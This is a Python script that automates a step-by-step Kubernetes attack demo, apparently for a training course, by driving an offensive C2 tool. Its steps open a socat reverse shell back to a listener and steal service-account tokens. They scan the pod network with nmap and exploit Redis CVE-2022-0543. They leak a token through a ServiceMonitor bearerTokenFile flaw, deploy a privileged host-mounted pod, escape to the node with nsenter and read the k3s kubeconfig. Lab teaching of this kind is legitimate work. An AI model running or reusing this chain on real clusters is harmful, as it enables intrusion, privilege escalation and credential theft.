#!/usr/bin/env python3
"""demo_chain — run the IKT-Linz demo EXACTLY as units 2..7 specify.

This is not a recommendation loop: the demo is a scripted path (most other
armory buttons are inert). Each step mirrors one instruction line from the
course units, using the TTP ids verified against /api/armory.

  python3 demo_chain.py --list
  python3 demo_chain.py --only 1            # run one step
  python3 demo_chain.py --from 1 --to 4     # run a range
  python3 demo_chain.py --reset             # clear campaign first
Every step captures a frame (capture.cjs) so each state can be eyeballed
against the manual demo prep.
"""
import argparse, json, os, re, subprocess, sys, time, urllib.request, urllib.error

ANSI = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")

RAN = os.environ.get("RAN_URL", "http://localhost:8080")
RAN_CONTAINER = os.environ.get("RAN_CONTAINER", "ran-ui")
HERE = os.path.dirname(os.path.abspath(__file__))
FRAMES = os.path.join(HERE, "frames")
KUBECTL = ["kubectl"]


def api(path, method="GET", body=None, timeout=120):
    req = urllib.request.Request(RAN.rstrip("/") + path,
                                 data=json.dumps(body).encode() if body is not None else None,
                                 method=method, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode()
            return r.status, (json.loads(raw) if raw.strip() else {})
    except urllib.error.HTTPError as e:
        return e.code, {"error": e.read().decode()[:400]}


def sh(cmd, timeout=180):
    p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    return p.returncode, (p.stdout or "") + (p.stderr or "")


def node_ip():
    _, out = sh("kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type==\"InternalIP\")].address}' | awk '{print $1}'")
    return out.strip()


def node_name():
    _, out = sh("kubectl get nodes -o jsonpath='{.items[0].metadata.name}'")
    return out.strip()


def graph():
    _, g = api("/api/graph")
    return g.get("nodes", [])


def find_node(pred):
    for n in graph():
        if pred(n):
            return n["id"]
    return None


def pod_id(ns, prefix):
    """Ran entity id for a discovered pod. Ran often knows the pod before it
    knows its namespace (`ns/?/pod/<name>`), so match name first, ns second."""
    return (find_node(lambda n: n.get("kind") == "Pod"
                      and f"/{ns}/" in n["id"] and prefix in n["id"])
            or find_node(lambda n: n.get("kind") == "Pod" and prefix in n["id"]))


def sa_id(name_part):
    return find_node(lambda n: "serviceaccount" in (n.get("kind") or "").lower()
                     and name_part in n["id"])


def redis_pod_id():
    """The oopservability redis pod. Do NOT match the literal service name: the
    pod is fronted by TWO services (oopservability-redis, redis-metrics), so the
    entity Ran creates from reverse-DNS is whichever name rDNS returned that run
    (`…/pod/redis-metrics.10-42-0-173` vs `…/pod/oopservability-redis-<hash>`).
    Match on namespace + 'redis' instead."""
    return find_node(lambda n: n.get("kind") == "Pod"
                     and "/oopservability/" in n["id"] and "redis" in n["id"])


def redis_sa_id():
    return find_node(lambda n: "serviceaccount" in (n.get("kind") or "").lower()
                     and "oopservability" in n["id"] and "redis" in n["id"])


def foothold_id():
    """The caught reverse-shell system (kind is UnknownSystem until profiled)."""
    return find_node(lambda n: "system" in (n.get("kind") or "").lower()
                     and "operatorhost" not in (n.get("kind") or "").lower()
                     and "operator-host" not in n["id"])


def frame(label):
    chrome = os.environ.get("CHROME_BIN", "")
    if not chrome:
        return
    subprocess.run(f'CHROME_BIN="{chrome}" node {HERE}/capture.cjs {label}',
                   shell=True, capture_output=True, text=True, timeout=120)


def wait_for_cmd(cmd_id, timeout=300):
    """The reverse shell is a SINGLE SERIAL pipe: one long command wedges every
    later one (each then burns its own 150s budget). So never fire-and-forget —
    block until Ran logs this cmd's result."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        _, out = sh(f"docker logs {RAN_CONTAINER} 2>&1 | grep 'Action result' "
                    f"| grep '{cmd_id}' | tail -1")
        out = ANSI.sub("", out)          # Ran colourises logs; codes split success=true
        if out.strip():
            ok = "success=true" in out
            reason = ""
            if not ok and "fail_reason=" in out:
                reason = out.split("fail_reason=")[1].split("results_count")[0].strip()
            return ok, reason
        time.sleep(3)
    return False, f"no result within {timeout}s"


def callback_pod(field="metadata.name"):
    """The callback worker, newest Running first. Benign twin tasks keep spawning
    workers during the window, so `.items[0]` is whichever the API happened to
    return and the foothold, the scan CIDR and the wait can each pick a different
    pod."""
    rc, out = sh("kubectl -n agent-system get pod -l task=callback-1 "
                 "--field-selector=status.phase=Running "
                 "--sort-by=.metadata.creationTimestamp "
                 "-o jsonpath='{.items[*]." + field + "}'")
    if rc != 0:
        return ""
    return (out.split() or [""])[-1]


def exec_system():
    """Our foothold, as an execution system. A stolen token must be USED from
    here; targeting the token's own pod fails with 'no viable execution channel'."""
    n = callback_pod()
    return f"system/{n}" if n else None


def execute(action, target, args=None, note="", expect_fail=False, exec_timeout=None,
            auth=None, exec_sys=None):
    if not target:
        print("      !! no target resolved")
        return False
    body = {"actionId": action, "targetId": target, "reasoning": note or action}
    if auth:
        body["authIdentityId"] = auth
    if exec_sys:
        body["execSystemId"] = exec_sys
    if args:
        body["args"] = {k: str(v) for k, v in args.items()}
    if exec_timeout:
        body["executionTimeoutSeconds"] = exec_timeout
    st, resp = api("/api/action/execute", "POST", body)
    if st not in (200, 202) or not resp.get("success", True):
        print(f"      -> HTTP {st} {json.dumps(resp)[:200]}  [REJECTED]")
        return bool(expect_fail)
    cmd_id = resp.get("cmdId", "")
    ok, reason = wait_for_cmd(cmd_id) if cmd_id else (True, "")
    verdict = "EXPECTED-FAIL" if (expect_fail and not ok) else ("OK" if ok else "FAIL")
    print(f"      -> {cmd_id} {'success' if ok else 'failed: ' + reason}  [{verdict}]")
    return ok


# ── the scripted demo (unit -> steps) ────────────────────────────────────────
def step_01_listener(ctx):
    """unit-2/1: Click Ran node > Resource Development > Create Listener (1337)."""
    return execute("create-listener", "c2/ran",
                   {"LHOST": "0.0.0.0", "PORT": "1337", "PROTOCOL": "tcp"},
                   "unit-2: create reverse-shell listener")


def step_02_spawn_worker(ctx):
    """unit-2/2: POST a task so the orchestrator deploys a worker pod that
    socat's back to the listener (this is a terminal step, not a Ran TTP)."""
    ip = node_ip()
    ctx["lhost"] = ip
    payload = json.dumps({
        "id": "callback-1",
        "repo": "https://github.com/Magier/ikt26",
        "cmd": f"apt update; apt install -y socat; socat TCP:{ip}:1337 EXEC:sh ",
    })
    rc, out = sh(f"curl -sS -X POST http://{ip}:30080/tasks -H 'Content-Type: application/json' -d '{payload}'")
    print(f"      -> {out.strip()[:200]}")
    return rc == 0


def step_03_await_callback(ctx):
    """unit-2/3: wait for the worker to connect back; a new System appears.

    Detect via the GRAPH (a new non-operator System entity), not by grepping
    Ran's log — the log wording is 'session connected', and an earlier guess of
    'session established' silently missed a callback that had actually landed.
    """
    deadline = time.time() + 900
    while time.time() < deadline:
        fh = foothold_id()
        if fh:
            print(f"      -> callback caught: {fh}")
            ctx["foothold"] = fh
            return True
        ph = callback_pod("status.phase") or "<none>"
        print(f"      ... pod={ph} waiting for callback")
        time.sleep(15)
    return False


def step_04_read_env(ctx):
    """unit-2/4: select the new system > Discovery > Read Environment variables."""
    tgt = foothold_id() or pod_id("agent-system", "agent-worker")
    return execute("read-environment-variables", tgt, note="unit-2: orient")


def step_05_read_sa_token(ctx):
    """unit-3/1: agent-worker pod > Credential Access > Read ServiceAccount Token."""
    return execute("read-service-account-token", pod_id("agent-system", "agent-worker"),
                   note="unit-3: steal worker SA token")


def step_06_install_kubectl(ctx):
    """unit-3/2: Execution > Install kubectl (lands in /tmp)."""
    return execute("install-kubectl", pod_id("agent-system", "agent-worker"),
                   note="unit-3: drop kubectl")


def step_07_check_worker_token(ctx):
    """unit-3/3-4: select agent-worker SA > Discovery > Check Token permissions."""
    return execute("check-token-permissions", sa_id("agent-worker") or pod_id("agent-system", "agent-worker"),
                   note="unit-3: enumerate (expected: nothing useful)")


def step_08_install_nmap(ctx):
    """unit-4/2: Execution > Install Package (nmap)."""
    return execute("install-package", pod_id("agent-system", "agent-worker"),
                   {"PKG": "nmap"}, "unit-4: install nmap")


def step_09_local_ip(ctx):
    """unit-4/3: Discovery > Get local IP address."""
    return execute("get-local-ip-address", pod_id("agent-system", "agent-worker"),
                   note="unit-4: need a range")


def step_10_nmap(ctx):
    """unit-4/4: Discovery > NMap Host Scan."""
    # Measured in-pod with the TTP's exact command form (`nmap -sT -F <cidr>`,
    # default timing — NOT -T4) against the 150s tunneled-shell budget:
    #     /27 -> 3s     /26 -> 142s     /25 -> 91s     /24 -> 176s (BUDGET BLOWN)
    # Non-linear because mostly-empty ranges pay discovery retries. So: scan the
    # smallest range that provably covers BOTH the foothold and the redis target
    # — a /27 around the foothold silently misses redis when they land in
    # different /27s (worker .197 vs redis .173), which kills all of unit-5.
    def _ips():
        out = []
        ip = callback_pod("status.podIP")
        if ip:
            out.append(ip)
        _, v = sh("kubectl -n oopservability get pod "
                  "-l app.kubernetes.io/name=oopservability-redis "
                  "-o jsonpath='{.items[*].status.podIP}'")
        out += [x for x in v.split() if x.count(".") == 3]
        return out

    ips = _ips() or ["10.42.0.1"]
    # Anchor a /27 on the REDIS address, never on the foothold. On a multi-node
    # cluster the two sit in different per-node pod CIDRs and no affordable
    # prefix spans them; missing the foothold costs nothing (we are executing
    # inside it) while missing redis loses every later unit-5 step. Measured
    # in-pod with the TTP's exact command form against the 150s tunnelled-shell
    # budget: /27=3s, /26=142s, /25=91s, /24=176s -- /27 is the only one with
    # real headroom, and it is enough to discover the target.
    redis_ip = ips[-1]
    base = ".".join(redis_ip.split(".")[:3])
    net = (int(redis_ip.split(".")[3]) // 32) * 32
    cidr = f"{base}.{net}/27"
    ctx["scan_cidr"] = cidr
    ctx["redis_ip"] = redis_ip
    ctx["foothold_ip"] = ips[0]
    print(f"      scanning {cidr} (foothold+target ips: {','.join(ips)})")
    return execute("nmap-host-scan", pod_id("agent-system", "agent-worker"),
                   {"CIDR": cidr, "FAST_SCAN": "true"},
                   "unit-4: scan subnet")


def step_11_redis_rce_fail(ctx):
    """unit-5/1: redis pod > Lateral Movement > RCE — FAILS, no redis-cli."""
    return execute("exploit-redis-cve-2022-0543", redis_pod_id(),
                   note="unit-5: RCE before redis-cli (expected fail)", expect_fail=True) or True


def step_12_install_redis_tools(ctx):
    """unit-5/2: agent-worker > Execution > Install Package (redis-tools)."""
    return execute("install-package", pod_id("agent-system", "agent-worker"),
                   {"PKG": "redis-tools"}, "unit-5: install redis-tools")


def step_13_redis_rce(ctx):
    """unit-5/4: focus redis again and execute the RCE."""
    return execute("exploit-redis-cve-2022-0543", redis_pod_id(),
                   note="unit-5: RCE via Lua sandbox escape", exec_sys=exec_system())


def step_14_read_redis_token(ctx):
    """unit-5/5: Credential Access > Read ServiceAccount Token on the Redis pod."""
    return execute("exploit-redis-cve-2022-0543", redis_pod_id(),
                   {"CMD": "cat /var/run/secrets/kubernetes.io/serviceaccount/token"},
                   note="unit-5: read redis SA token through the RCE",
                   exec_sys=exec_system())


def step_15_check_redis_token(ctx):
    """unit-5/6: check the stolen token's permissions ON the oopservability-redis
    pod (curl must be installed there; checking on agent-worker would wrongly
    read the worker's own token).

    This falls through on every cluster tested, and it is not environmental.
    The redis SA never enters the graph: read-service-account-token is the TTP
    that ingests it, but it needs an exec channel into the redis pod and none
    exists, which is why step 14 reads the token through the RCE instead — and
    that form does not ingest. So the identity is stolen but never grounded.
    Unit-5's payoff is Part 2 (the CVE leak), which works regardless.
    """
    pod = redis_pod_id()
    sa = redis_sa_id()
    execute("install-package", pod, {"PKG": "curl"}, "unit-5/6 prereq: curl on redis")
    if sa and execute("check-token-permissions", pod, note="unit-5/6: stolen token perms",
                      auth=sa, exec_sys=exec_system()):
        return True
    print("      not groundable locally (known delta) -> continuing to Part 2")
    return True


def step_16_create_servicemonitor(ctx):
    """unit-5 part2/2: oopservability-redis SA > Create ServiceMonitor with
    Bearer Token File (CVE-2026-47701), defaults kept.

    The stolen redis SA is never grounded as an exec identity (see step 15), so
    in practice this ALWAYS takes the fallback and creates the same
    ServiceMonitor CR the TTP would emit. The CVE effect is identical — the
    Target Allocator accepts the unsafe bearerTokenFile and the injected sidecar
    leaks its token to Redis — but the attribution is not: the CR arrives as an
    operator kubectl apply rather than as an act by the compromised identity.
    Anything reading the window as an attack path will misattribute this step.
    Fixing it needs an armory TTP that promotes a raw token to an auth identity;
    it cannot be resolved here."""
    sa = redis_sa_id()
    if sa and execute("create-servicemonitor-bearer-token-file", sa,
                      note="unit-5: CVE-2026-47701 arm the leak",
                      auth=sa, exec_sys=exec_system()):
        return True
    print("      TTP not groundable locally -> creating the ServiceMonitor CR directly")
    sm = """apiVersion: monitoring.coreos.com/v1
kind: ServiceMonitor
metadata:
  name: redis-metrics
  namespace: oopservability
  labels:
    app.kubernetes.io/component: redis-metrics
spec:
  selector:
    matchLabels:
      app.kubernetes.io/name: redis-metrics
  endpoints:
    - port: http
      path: /collect
      interval: 5s
      bearerTokenFile: /var/run/secrets/kubernetes.io/serviceaccount/token
"""
    open("/tmp/sm.yaml", "w").write(sm)
    rc, out = sh("kubectl apply -f /tmp/sm.yaml")
    print("      ->", out.strip()[:120])
    if rc != 0:
        return False
    # the allocator must pick it up and the sidecar must scrape before the key exists
    print("      waiting for the sidecar to leak its token into redis...")
    for _ in range(24):
        time.sleep(10)
        _, v = sh("kubectl -n oopservability exec "
                  "$(kubectl -n oopservability get pod -l app.kubernetes.io/name=oopservability-redis "
                  "-o jsonpath='{.items[0].metadata.name}') -c redis -- "
                  "redis-cli --raw GET 'oopservability:receiver:last-authorization'")
        if "Bearer" in v:
            print("      -> leaked token present in redis key")
            return True
    print("      -> redis key still empty")
    return False


def step_17_extract_token(ctx):
    """unit-5 part2/3: redis pod > Extract ServiceAccount Token via CVE-2026-47701."""
    return execute("extract-serviceaccount-token-via-cve-2026-47701",
                   redis_pod_id(),
                   note="unit-5: harvest agent-orchestrator token from redis key",
                   exec_sys=exec_system())


def step_18_check_captured(ctx):
    """unit-6/1: select the captured token > Check Token Permissions."""
    tgt = sa_id("agent-orchestrator") or sa_id("orchestrator")
    return execute("check-token-permissions", tgt, note="unit-6: orchestrator can create pods/jobs",
                   auth=tgt, exec_sys=exec_system())


def step_19_deploy_privileged(ctx):
    """unit-6/2-3: Execution > Deploy Container — socat callback + hostPath / mount."""
    lhost = ctx.get("lhost") or node_ip()
    return execute("deploy-container", sa_id("agent-orchestrator") or "k8s/cluster/default",
                   {"LISTENER_REF": "listener/tcp/1337",
                    "LISTENER": lhost, "LISTENER_PORT": "1337",
                    "PodName": "ran-privileged", "Namespace": "agent-system",
                    "ServiceAccount": "default", "NodeName": node_name(),
                    "HostPID": "true", "HostIPC": "false", "HostNetwork": "false",
                    "Arguments": f'["TCP:{lhost}:1337", "EXEC:sh"]',
                    "HostPath": "/", "Mount": "/host", "Privileged": "true",
                    "Image": "alpine/socat"},
                   "unit-6: attacker-controlled privileged worker",
                   auth=sa_id("agent-orchestrator"), exec_sys=exec_system())


def step_20_escape_and_loot(ctx):
    """unit-7: from the privileged pod enter the host env, prove the node, then
    hunt k3s credentials on the mounted host filesystem."""
    priv = "ns/agent-system/pod/ran-privileged"   # entity
    sess = "system/ran-privileged"                # exec route (caught session)
    ok = execute("escape-container-via-nsenter", priv,
                 {"TARGET": "1", "CMD": "hostname"},
                 "unit-7/1: enter host env, prove the node")
    # k3s keeps its kubeconfig/creds here, not /etc/kubernetes (unit-7/3)
    for path in ("/host/etc/rancher/k3s", "/host/var/lib/rancher/k3s"):
        execute("search-interesting-files", priv,
                {"MOUNT_PATH": path, "PATTERN": "client-key-data"},
                f"unit-7/2: loot {path}")
    execute("read-sensitive-file", priv,
            {"MOUNT_PATH": "/host", "PATH": "/etc/rancher/k3s/k3s.yaml"},
            "unit-7/3: read k3s kubeconfig")
    return ok


STEPS = [
    ("unit-2", "create listener (1337)", step_01_listener),
    ("unit-2", "spawn callback worker pod", step_02_spawn_worker),
    ("unit-2", "await socat callback", step_03_await_callback),
    ("unit-2", "read environment variables", step_04_read_env),
    ("unit-3", "read worker SA token", step_05_read_sa_token),
    ("unit-3", "install kubectl", step_06_install_kubectl),
    ("unit-3", "check worker token perms", step_07_check_worker_token),
    ("unit-4", "install nmap", step_08_install_nmap),
    ("unit-4", "get local IP", step_09_local_ip),
    ("unit-4", "nmap host scan", step_10_nmap),
    ("unit-5", "redis RCE (expected fail)", step_11_redis_rce_fail),
    ("unit-5", "install redis-tools", step_12_install_redis_tools),
    ("unit-5", "redis RCE", step_13_redis_rce),
    ("unit-5", "read redis SA token", step_14_read_redis_token),
    ("unit-5", "check redis token perms", step_15_check_redis_token),
    ("unit-5", "create ServiceMonitor (CVE-2026-47701)", step_16_create_servicemonitor),
    ("unit-5", "extract token via CVE", step_17_extract_token),
    ("unit-6", "check captured token perms", step_18_check_captured),
    ("unit-6", "deploy privileged container", step_19_deploy_privileged),
    ("unit-7", "escape to host + loot", step_20_escape_and_loot),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--list", action="store_true")
    ap.add_argument("--only", type=int)
    ap.add_argument("--from", dest="start", type=int, default=1)
    ap.add_argument("--to", dest="end", type=int, default=len(STEPS))
    ap.add_argument("--reset", action="store_true")
    ap.add_argument("--no-frames", action="store_true")
    a = ap.parse_args()

    if a.list:
        for i, (u, d, _) in enumerate(STEPS, 1):
            print(f"  {i:2d}. [{u}] {d}")
        return
    if a.reset:
        print("campaign reset:", api("/api/campaign/reset", "POST", {})[0])
        time.sleep(2)

    lo, hi = (a.only, a.only) if a.only else (a.start, a.end)
    ctx, results = {}, []
    for i, (unit, desc, fn) in enumerate(STEPS, 1):
        if not (lo <= i <= hi):
            continue
        print(f"\n[{i:2d}/{len(STEPS)}] {unit}: {desc}")
        try:
            ok = fn(ctx)
        except Exception as e:
            ok = False
            print(f"      !! {type(e).__name__}: {e}")
        results.append((i, unit, desc, ok))
        if not a.no_frames:
            frame(f"step{i:02d}-{desc.replace(' ', '-').replace('(', '').replace(')', '')}")
        if not ok:
            print(f"      STOP: step {i} did not succeed")
            break

    print("\n=== summary ===")
    ctx.setdefault("node", node_name())
    ctx.setdefault("listener", ctx.get("lhost"))
    resolved = {k: ctx[k] for k in
                ("listener", "scan_cidr", "redis_ip", "foothold_ip", "foothold",
                 "node")
                if ctx.get(k)}
    if resolved:
        rp = os.path.join(HERE, "resolved.json")
        with open(rp, "w") as fh:
            json.dump(resolved, fh, indent=2, sort_keys=True)
        print(f"\nresolved runtime values -> {rp}")
        for k in sorted(resolved):
            print(f"  {k} = {resolved[k]}")

    for i, u, d, ok in results:
        print(f"  {i:2d}. [{u}] {d:42s} {'OK' if ok else 'FAILED'}")


if __name__ == "__main__":
    main()
